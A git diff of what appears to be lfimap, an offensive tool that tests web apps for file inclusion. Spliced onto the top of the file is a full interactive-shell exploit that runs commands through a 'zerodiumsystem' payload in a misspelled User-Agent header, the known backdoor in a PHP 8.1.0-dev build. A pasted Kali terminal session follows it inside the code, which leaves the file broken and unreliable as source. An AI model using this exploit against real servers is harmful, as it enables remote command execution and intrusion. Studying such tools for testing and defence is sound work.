@@ -1,4 +1,61 @@
 #!/usr/bin/env python3
+import os
+import re
+import requests
+
+host = input("Enter the full host url:\n")
+request = requests.Session()
+response = request.get(host)
+
+if str(response) == '<Response [200]>':
+    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
+    try:
+        while 1:
+            cmd = input("$ ")
+            headers = {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
+            "User-Agentt": "zerodiumsystem('" + cmd + "');"
+            }
+            response = request.get(host, headers = headers, allow_redirects = False)
+            current_page = response.text
+            stdout = current_page.split('<!DOCTYPE html>',1)
+            text = print(stdout[0])
+    except KeyboardInterrupt:
+        print("Exiting...")
+        exit
+
+else:
+    print("\r")
+    print(response)
+    print("Host is not available, aborting...")
+    exit
+┌──(kali㉿kali)-[~]
+└─$ rm exploit.py                                                                     
+rm: remove write-protected regular file 'exploit.py'? ls
+┌──(kali㉿kali)-[~]
+└─$ ls                                                                                
+Desktop    Downloads   Music  Pictures  Public     Videos
+Documents  exploit.py  peda   Private   Templates
+┌──(kali㉿kali)-[~]
+└─$ rm exploit.py 
+rm: remove write-protected regular file 'exploit.py'? y
+┌──(kali㉿kali)-[~]
+└─$ ls                                                                                
+Desktop    Downloads  peda      Private  Templates
+Documents  Music      Pictures  Public   Videos
+┌──(kali㉿kali)-[~]
+└─$ cd Private/                                                                       
+┌──(kali㉿kali)-[~/Private]
+└─$ ls                                                                                
+ctf  lfimap  mach1ne
+┌──(kali㉿kali)-[~/Private]
+└─$ cd lfimap/                                                                        
+┌──(kali㉿kali)-[~/Private/lfimap]
+└─$ ls                                                                                
+lfimap.py  LICENSE  README.md  requirements.txt  wordlist.txt
+┌──(kali㉿kali)-[~/Private/lfimap]
+└─$ cat lfimap.py                                                                     
+#!/usr/bin/env python3
 
 import os
 import sys
@@ -10,6 +67,7 @@ import argparse
 import requests
 import requests.exceptions
 import threading
+import time
 
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 from argparse import RawTextHelpFormatter
@@ -306,11 +364,11 @@ def test_rfi(url):
     
     #Local RFI test
     if(args.lhost):
-        server = HTTPServer((args.lhost, args.lport), MyHandler)
+        server = HTTPServer((args.lhost, 75), MyHandler)
         threading.Thread(target = server.serve_forever).start()
 
         if('DESTROY' in url):
-            pyld = "http%3a//"+args.lhost+":"+str(args.lport)
+            pyld = "http%3a//"+args.lhost+":75/"
             u = url.replace('DESTROY', pyld)
             try:
                 res = requests.get(u, headers = headers, proxies = proxies, timeout = 2)
@@ -323,18 +381,17 @@ def test_rfi(url):
                 pass
     
     #Internet RFI test
-    else:
-        if("DESTROY" in url):
-            pyld = "https%3a//www.google.com/"
-            u = url.replace("DESTROY", pyld)
-        try:
-            res = requests.get(u, headers = headers, proxies = proxies, timeout = 2)
-            if(checkPayload(res)):
-                tempUrl = u.replace(pyld, 'TMP')
-                getExploit(res, 'GET', 'RFI', tempUrl, '', headers, 'RFI', 'UNKN')
-                print("[+] RFI -> " + u)
-        except:
-            pass
+    if("DESTROY" in url):
+        pyld = "https%3a//www.google.com/"
+        u = url.replace("DESTROY", pyld)
+    try:
+        res = requests.get(u, headers = headers, proxies = proxies, timeout = 2)
+        if(checkPayload(res)):
+            tempUrl = u.replace(pyld, 'TMP')
+            getExploit(res, 'GET', 'RFI', tempUrl, '', headers, 'RFI', 'UNKN')
+            print("[+] RFI -> " + u)
+    except:
+        pass
 
     if(args.revshell):
         exploit(exploits, 'RFI')
@@ -528,7 +585,7 @@ def main():
         proxies['https'] = 'https://'+args.proxyAddr
 
     #Perform all tests
-    if(test_all):
+    if(args.test_all):
         test_php_filter(url)
         test_php_input(url)
         test_php_data(url)
@@ -604,14 +661,32 @@ if(__name__ == "__main__"):
     args = parser.parse_args()
 
     url = args.url
-    cookie = args.cookie
     wordlist = args.wordlist
-    test_all = args.test_all
     agent = args.agent
     referer = args.referer
-    rfi = args.rfi
 
+    #Checks if provided URL is valid
+    urlRegex = re.compile(
+    r'^(?:http|ftp)s?://' # http:// or https:// or ftp://
+    r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
+    r'localhost|' #localhost...
+    r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
+    r'(?::\d+)?' # optional port
+    r'(?:/?|[/?]\S+)$', re.IGNORECASE)
     
+    if(re.match(urlRegex, url) is None):
+        print("URL not valid, exiting...")
+        sys.exit(-1)
+    
+    #Checks if provided wordlist exists
+    if(wordlist is not None):
+        if(not os.path.isfile(wordlist)):
+            print("Specified wordlist doesn't exist. Exiting...")
+            sys.exit(-1)
+    else:
+        wordlist = "wordlist.txt"
+    
+    #Checks if '--lhost' and '--lport' are provided with '-x'
     if(args.revshell):
         if(not args.lhost or not args.lport):
             print("Please, specify localhost IP and PORT number for reverse shell! Exiting...")
@@ -626,40 +701,24 @@ if(__name__ == "__main__"):
                 print("LPORT must be between 0 and 65535. Exiting ...")
                 sys.exit(-1)
 
-
-    #Checks URL arg
-    urlRegex = re.compile(
-    r'^(?:http|ftp)s?://' # http:// or https:// or ftp://
-    r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
-    r'localhost|' #localhost...
-    r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
-    r'(?::\d+)?' # optional port
-    r'(?:/?|[/?]\S+)$', re.IGNORECASE)
-    
-    
+    #Checks if any parameter is selected for testing
     if("DESTROY" not in url):
         print("Please use DESTROY as a vulnerable parameter value that you want to exploit\n")
         sys.exit(-1)
-
-    if(not cookie):
+    
+    #Warning if cookie is not provided
+    if(not args.cookie):
         print("WARNING: Cookie argument ('-c') is not provided. lfimap might have troubles finding vulnerabilities if web app requires a cookie.\n")
-    
-    if(re.match(urlRegex, url) is None):
-        print("URL not valid, exiting...")
-        sys.exit(-1)
+        time.sleep(2)
 
-    #Checks if provided wordlist arg exists, in main is selects wordlist based on target OS type
-    if(wordlist is not None):
-        if(not os.path.isfile(wordlist)):
-            print("Specified wordlist doesn't exist. Exiting...")
-            sys.exit(-1)
-    else:
-        wordlist = "wordlist.txt"
-     
+    if(args.rfi and not args.lhost):
+        print("WARNING: RFI test will try to include source from internet, not locally, because '--lhost' is not set.\n")
+        time.sleep(2)
+
+    
+    #Everything is OK, preparing http request headers
     headers = prepareHeaders()
-
-    if(cookie is not None):
-        addHeader('Cookie', cookie)
-    
+    if(args.cookie is not None):
+        addHeader('Cookie', args.cookie)
     
     main()
